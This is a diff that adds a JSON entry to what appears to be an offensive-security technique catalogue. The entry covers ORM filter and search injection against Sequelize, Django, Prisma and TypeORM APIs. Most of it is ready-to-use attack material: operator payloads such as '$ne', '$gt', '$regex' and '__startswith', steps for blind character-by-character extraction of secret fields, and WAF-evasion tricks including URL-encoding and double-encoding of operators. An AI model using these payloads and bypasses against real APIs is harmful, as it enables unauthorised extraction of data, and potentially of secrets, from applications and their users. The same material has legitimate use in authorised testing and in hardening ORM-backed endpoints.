@@ -1,0 +1,73 @@
+{
+  "id": "api-orm-filter-injection",
+  "title": "ORM Leak Exploitation via Filter/Search Injection",
+  "category": "api",
+  "tags": ["orm", "filter-injection", "sequelize", "django", "prisma", "typeorm", "data-exfiltration"],
+  "applicability": {
+    "technologies": ["node", "python-django", "python", "java", "ruby-rails"],
+    "contexts": ["api-endpoint", "url-parameter", "json-body", "search-filter"],
+    "preconditions": ["orm-backed-api", "user-controlled-filter-parameters"]
+  },
+  "technique": {
+    "summary": "Exploit ORM search/filter capabilities by injecting ORM-specific query operators through API parameters. Many frameworks pass filter parameters directly to ORM query builders, enabling operators like $ne, $gt, __startswith, and nested where clauses to extract data the API was not intended to expose.",
+    "steps": [
+      "Identify API endpoints that accept filter/search parameters (e.g., ?field=value, JSON body filters)",
+      "Test for Sequelize operators: field[$ne]=null, field[$gt]=, field[$in][]=value",
+      "Test for Django ORM lookups: field__startswith=a, field__regex=^a, field__icontains=test",
+      "Test for Prisma nested filters: {\"where\":{\"field\":{\"startsWith\":\"a\"}}}",
+      "Test for TypeORM FindOptions: {\"where\":{\"field\":{\"$not\":null}}} or field=!null",
+      "Confirm data leak by extracting values character-by-character via $regex or __startswith",
+      "Chain with blind extraction: iterate through charset, use boolean response differences to reconstruct secret values"
+    ],
+    "payloads": [
+      {
+        "payload": "field[$ne]=null",
+        "encoding": "url-query",
+        "context": "url-parameter",
+        "notes": "Sequelize — returns all records where field is not null (bypasses intended equality filter)"
+      },
+      {
+        "payload": "field[$gt]=",
+        "encoding": "url-query",
+        "context": "url-parameter",
+        "notes": "Sequelize — returns all records (greater-than empty string matches everything)"
+      },
+      {
+        "payload": "field[$regex]=^admin",
+        "encoding": "url-query",
+        "context": "url-parameter",
+        "notes": "Sequelize/Mongoose — regex filter for blind character-by-character extraction"
+      },
+      {
+        "payload": "field__startswith=a",
+        "encoding": "url-query",
+        "context": "url-parameter",
+        "notes": "Django ORM lookup injection — test if field starts with 'a', iterate charset for blind extraction"
+      },
+      {
+        "payload": "{\"where\":{\"secretField\":{\"startsWith\":\"a\"}}}",
+        "encoding": "json",
+        "context": "json-body",
+        "notes": "Prisma nested where filter — blind extraction via startsWith"
+      },
+      {
+        "payload": "field[$in][]=admin&field[$in][]=user",
+        "encoding": "url-query",
+        "context": "url-parameter",
+        "notes": "Sequelize $in operator — test for specific values in set"
+      }
+    ],
+    "bypassTechniques": [
+      "URL-encode operators: %24ne, %24gt, %24regex to bypass WAF or input sanitization",
+      "Use array syntax: field[$ne]= instead of JSON operator format",
+      "Nested JSON objects: {\"field\":{\"$ne\":null}} in request body instead of query string",
+      "Try both query string and JSON body — different parsing paths may have different sanitization",
+      "Double-encode operators for frameworks that decode twice: %2524ne",
+      "Use ORM-specific aliases: Sequelize Op.ne vs $ne, Django __exact vs = "
+    ]
+  },
+  "references": [
+    "https://portswigger.net/research/top-10-web-hacking-techniques-of-2025"
+  ],
+  "source": "portswigger-top10-2025"
+}
